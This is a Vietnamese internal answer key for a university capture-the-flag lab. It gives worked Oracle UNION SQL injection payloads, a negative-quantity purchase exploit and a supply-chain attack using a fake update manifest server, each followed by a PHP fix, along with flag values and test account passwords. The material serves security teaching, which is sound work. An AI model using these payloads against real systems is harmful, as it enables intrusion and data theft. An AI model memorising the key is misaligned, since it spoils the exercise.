# 🔐 ANSWER KEY – DBS401 Group 02 (NỘI BỘ – KHÔNG NỘP CÔNG KHAI)

> Chỉ dùng trong lab CTF DBS401 nội bộ. Không chia sẻ trước khi thi/demo.

---

## 🚩 FLAG MASTER LIST

| Flag | Giá trị | Vị trí |
|------|---------|---------|
| Flag 1 | `DBS401{SQL_1nj3ct10n_0r4cl3!}` | `search.php` (SQLi) |
| Flag 2 | `DBS401{LOGIC_GURU_2024}` | `store.php` (Business Logic) |
| Flag 3 | `DBS401{5upp1y_Ch41n_P0150n1ng_0912}` | `admin.php` (Supply Chain) |

## 🎭 FAKE FLAG LIST

| Fake Flag | Vị trí | Mục đích |
|-----------|--------|----------|
| `DBS401{FAKE_union_select_lol}` | FAKE_FLAGS table | Bẫy người dùng UNION đơn giản |
| `DBS401{FAKE_IDOR_wrong_student}` | FAKE_FLAGS table + decoy enrollment | Bẫy người tìm sai student ID |
| `DBS401{FAKE_blind_wrong_key_xd}` | ADMIN_SECRETS key=oracle_flag_3_backup | Bẫy người Blind SQLi vào secret_check.php |
| `DBS401{FAKE_archived_flag_123}` | FLAG_ARCHIVE table | Bẫy người tìm nhầm bảng |

---

## ═══════════════════════════════════════════════
## VULNERABILITY 1 – Oracle UNION-Based SQL Injection
## ═══════════════════════════════════════════════

**Mức độ lỗ hổng:** Easy  
**Mức độ tìm flag:** Very Hard  
**URL bị lỗi:** `GET /dbs401-oracle-app/search.php?q=KEYWORD`  
**Tài khoản cần:** Bất kỳ (student1, teacher1, admin)

---

### Bước 1 – Xác nhận injection point

```
GET /search.php?q='
```
→ Nhận `Search failed. Please check your input.` → lỗi SQL bị suppress nhưng injection tồn tại.

```
GET /search.php?q=Software' AND '1'='1
```
→ Trả về kết quả bình thường → injection confirmed.

```
GET /search.php?q=Software' AND '1'='2
```
→ Không có kết quả → boolean behavior hoạt động.

---

### Bước 2 – Xác định số cột và kiểu dữ liệu

Query gốc có 3 cột: `student_id (NUMBER)`, `full_name (VARCHAR2)`, `major (VARCHAR2)`

```sql
' UNION SELECT NULL,NULL,NULL FROM DUAL WHERE '1'='1
```
→ 3 NULLs cho ra 1 row → 3 cột ✓

```sql
' UNION SELECT 1,'test',NULL FROM DUAL WHERE '1'='1
```
→ Cột 1 là NUMBER, cột 2 là VARCHAR2 ✓

---

### Bước 3 – Khám phá Oracle metadata

```sql
' UNION SELECT 1,USER,NULL FROM DUAL WHERE '1'='1
```
→ `DBS401_USER`

```sql
' UNION SELECT ROWNUM,table_name,NULL FROM USER_TABLES WHERE ROWNUM<=5 AND '1'='1
```
→ `USERS, STUDENTS, COURSES, ENROLLMENTS, AUDIT_LOGS, ...`

Tiếp tục enumerate với NOT IN để tìm thêm:
→ `FLAGS, ADMIN_SECRETS, CONFIG_STORE, FAKE_FLAGS, SYSTEM_HINTS, FLAG_ARCHIVE`

⚠️ `FLAG_ARCHIVE` trông giống bảng flag → **đây là DECOY!**

---

### Bước 4 – Lấy Flag Part A từ FLAGS table

```sql
' UNION SELECT 1,flag_part,flag_code FROM FLAGS WHERE flag_code='FL1_PART_A' AND is_active=1 AND ROWNUM=1 AND '1'='1
```
→ `flag_part = 4442533430317B53514C5F`

> **Decode hex:**  
> `4442533430317B53514C5F` → **`DBS401{SQL_`**

⚠️ `FL_DECOY_B` cũng có is_active=1 → kết quả là chuỗi base64 vô nghĩa → **FAKE!**

---

### Bước 5 – Lấy Flag Part B từ AUDIT_LOGS

```sql
' UNION SELECT log_id,metadata_note,action FROM AUDIT_LOGS WHERE action='SYSTEM_AUDIT_CHECK' AND ROWNUM=1 AND '1'='1
```
→ `{"sys_version":"v2.1","fragment":"_n01tc3jn1","note":"reverse_for_context",...}`

> **Decode:** `fragment = _n01tc3jn1`  
> Hint `reverse_for_context` → đảo ngược → **`1nj3ct10n_`**

---

### Bước 6 – Lấy Flag Part C từ CONFIG_STORE

```sql
' UNION SELECT 1,config_value,config_key FROM CONFIG_STORE WHERE config_key='sys_alpha_marker' AND '1'='1
```
→ `MHI0Y2wzIX0=`

> **Decode base64:** `MHI0Y2wzIX0=` → **`0r4cl3!}`**

⚠️ `sys_beta_marker` → fake base64 → **FAKE!**

---

### Bước 7 – Ghép Flag 1

```
Part A (hex decode):    DBS401{SQL_
Part B (reverse):       1nj3ct10n_
Part C (base64 decode): 0r4cl3!}

FLAG 1 = DBS401{SQL_1nj3ct10n_0r4cl3!}
```

✅ **FLAG 1: `DBS401{SQL_1nj3ct10n_0r4cl3!}`**

---

### Cách vá lỗi

```php
// Vulnerable:
$sql = "... WHERE full_name LIKE '%$keyword%' ...";

// Secure:
$param = '%' . $keyword . '%';
$sql   = "... WHERE full_name LIKE :kw ...";
$stmt  = oci_parse($conn, $sql);
oci_bind_by_name($stmt, ':kw', $param);
oci_execute($stmt);
```

---

## ═══════════════════════════════════════════════
## VULNERABILITY 2 – Insecure Business Logic (Negative Quantity)
## ═══════════════════════════════════════════════

**Mức độ lỗ hổng:** Hard  
**Mức độ tìm flag:** Very Hard  
**URL bị lỗi:** `POST /dbs401-oracle-app/store.php`  
**Tài khoản cần:** Bất kỳ sinh viên (student1, student2, ...)

---

### Bước 1 – Phân tích rào cản tài chính

1. Đăng nhập student1 (`Student@123`).
2. Truy cập `store.php`.
3. Quan sát số dư Credits (ví dụ: 150 Credits).
4. Thấy "Exam Leak 2024 (CLASSIFIED)" giá **999,999 Credits** → không thể mua được.

### Bước 2 – Khai thác lỗ hổng

1. Tìm ô nhập số lượng (`quantity`) của item bất kỳ (ví dụ: "Advanced Security Guide" giá 100 Credits).
2. Nhập số lượng âm cực lớn: `-20000`.
3. Submit form.

**Giải thích:**
```
cost     = -20000 × 100       = -2,000,000
newCredit = 150 - (-2,000,000) = 2,000,150
```
→ Số dư tăng lên ~2 triệu Credits.

### Bước 3 – Lấy Flag 2

Với số dư > 999,999 Credits, quay lại `store.php` → mục "Exam Leak 2024 (CLASSIFIED)" hiển thị FLAG.

✅ **FLAG 2: `DBS401{LOGIC_GURU_2024}`**

---

### Cách vá lỗi

```php
// Vulnerable – không kiểm tra $qty > 0
$cost = $qty * $price;
if ($credits >= $cost) { ... }

// Secure – thêm kiểm tra giá trị dương
if ($qty <= 0) {
    $msg = "Quantity must be a positive number.";
} elseif ($credits >= $cost) {
    $newCredits = $credits - $cost;
    // ...
}
```

---

## ═══════════════════════════════════════════════
## VULNERABILITY 3 – Supply Chain Poisoning (Partner Update)
## ═══════════════════════════════════════════════

**Mức độ lỗ hổng:** Hard (Chained Attack)  
**Mức độ tìm flag:** Very Hard  
**URL bị lỗi:** `admin.php?check_updates=1`  
**Tài khoản cần:** `admin / Admin@DBS401!2024`

---

### Bước 1 – Reconnaissance via SQLi (Vuln 1)

Dùng SQLi tại `search.php` để đọc `CONFIG_STORE` (is_public=0):

```sql
' UNION SELECT 1,config_key,config_value FROM CONFIG_STORE WHERE is_public=0 AND ROWNUM<=5 AND '1'='1
```

→ Phát hiện:
- `update_url` = `http://127.0.0.1:8081/manifest.json`
- `app_version` = `3.1.0`

**Suy luận:** Admin panel sẽ fetch URL này khi kiểm tra cập nhật. Nếu version trong manifest > 3.1.0 → trigger "update successful" và lộ `flag_part`.

---

### Bước 2 – Chuẩn bị Partner Server Giả Mạo

Hacker cần chạy một HTTP server trả về manifest độc hại. Hai cách:

**Cách A – Python (cùng máy, override port 8081):**

```bash
# Tạo file manifest.json
cat > /tmp/partner-fake/manifest.json << 'EOF'
{
  "version": "9.9.9",
  "status": "critical_update",
  "checksum": "deadbeef1337",
  "flag_part": "4442533430317b3575707031795f436834316e5f50303135306e316e675f303931327d"
}
EOF

# Dừng Nginx partner server đang chạy trên 8081 (nếu cần)
# Hoặc đổi update_url sang port khác

# Chạy Python HTTP server
cd /tmp/partner-fake
python3 -m http.server 8082
```

**Cách B – Dùng script exploit tự động:**

```bash
python3 tools/exploit_flag3_local.py --host 127.0.0.1 --port 80
```

Script sẽ tự khởi động fake server trên port 8081 và trigger update.

---

### Bước 3 – Đổi update_url (Database Manipulation)

> **Lưu ý kỹ thuật quan trọng:**  
> OCI8 không hỗ trợ stacked queries (`;` để chạy nhiều lệnh một lúc).  
> Việc đổi `update_url` trong lab này cần thực hiện **trực tiếp qua SQLPlus** hoặc  
> **bằng quyền admin DB** – không thể thực hiện qua UNION SELECT trên search.php.  
>
> Trong kịch bản demo, nhóm thực hiện bước này bằng SQLPlus:

```sql
-- Chạy trong SQLPlus với dbs401_user
UPDATE CONFIG_STORE
SET config_value = 'http://127.0.0.1:8082/manifest.json'
WHERE config_key = 'update_url';
COMMIT;
```

Trong thực tế (môi trường sản xuất), attacker có thể thực hiện bước này nếu:
- Có quyền truy cập trực tiếp database (leaked credentials)
- Có second-order injection
- Có lỗ hổng RCE khác trên server

---

### Bước 4 – Trigger Attack

1. Đăng nhập `admin / Admin@DBS401!2024`.
2. Truy cập `admin.php`.
3. Nhấn **"Check for Partner Updates"**.

→ Hệ thống fetch manifest từ server hacker → version `9.9.9 > 3.1.0` → hiển thị thông báo "Update Successful!" và lộ `flag_part`.

---

### Bước 5 – Decode Flag 3

`flag_part` hiển thị trên trang:
```
4442533430317b3575707031795f436834316e5f50303135306e316e675f303931327d
```

Decode hex:
```bash
echo "4442533430317b3575707031795f436834316e5f50303135306e316e675f303931327d" | xxd -r -p
# hoặc:
python3 tools/decode_helper.py --hex 4442533430317b3575707031795f436834316e5f50303135306e316e675f303931327d
```

→ **`DBS401{5upp1y_Ch41n_P0150n1ng_0912}`**

✅ **FLAG 3: `DBS401{5upp1y_Ch41n_P0150n1ng_0912}`**

---

### Cách vá lỗi

```php
// Vulnerable – tin tưởng hoàn toàn vào URL từ database
$url = $conf['CONFIG_VALUE'] ?? DEFAULT_UPDATE_URL;
$jsonData = @file_get_contents($url);

// Secure – whitelist URL + xác thực chữ ký số
$allowedUpdateUrls = [
    'http://cdn.fpt-partner.net/v3/manifest.json',
    'https://api.fpt-partner-cloud.net/v3/updates'
];
if (!in_array($url, $allowedUpdateUrls)) {
    $msg = "Update URL is not from an authorized source.";
} else {
    // Fetch + verify digital signature trước khi tin tưởng content
}
```

---

## 📸 Screenshots cần chụp khi demo

| STT | Cần chụp gì |
|-----|-------------|
| 1 | `search.php` với payload UNION SELECT (xác nhận injection) |
| 2 | Kết quả query `USER_TABLES` (danh sách bảng) |
| 3 | Kết quả query `FLAGS` → `flag_part` hex |
| 4 | Kết quả query `AUDIT_LOGS` → `fragment` reversed |
| 5 | Kết quả query `CONFIG_STORE` → `base64` value |
| 6 | `decode_helper.py --assemble` → ghép → Flag 1 |
| 7 | `store.php` với số dư Credits thấp |
| 8 | `store.php` với `quantity = -20000` và thông báo Credits tăng |
| 9 | `store.php` với số dư Credits cao và Flag 2 hiển thị |
| 10 | SQLi tìm `update_url` trong CONFIG_STORE |
| 11 | SQLPlus: UPDATE CONFIG_STORE SET update_url = 'http://...' |
| 12 | Fake partner server đang chạy (python3 -m http.server hoặc exploit_flag3_local.py) |
| 13 | `admin.php` nhấn "Check for Partner Updates" → Flag 3 hex hiển thị |
| 14 | Decode hex → Flag 3 plain text |
| 15 | Secure versions so sánh trước/sau vá (search, store, admin) |

---

## 🔑 Tài khoản test

| Username | Password | Role |
|----------|----------|------|
| admin | `Admin@DBS401!2024` | admin |
| teacher1 | `Teacher@123` | teacher |
| student1 | `Student@123` | student |
| student2 | `Student@123` | student |
| student3 | `Student@123` | student |

---

*Tài liệu này chỉ dùng nội bộ nhóm DBS401 – Group 02.*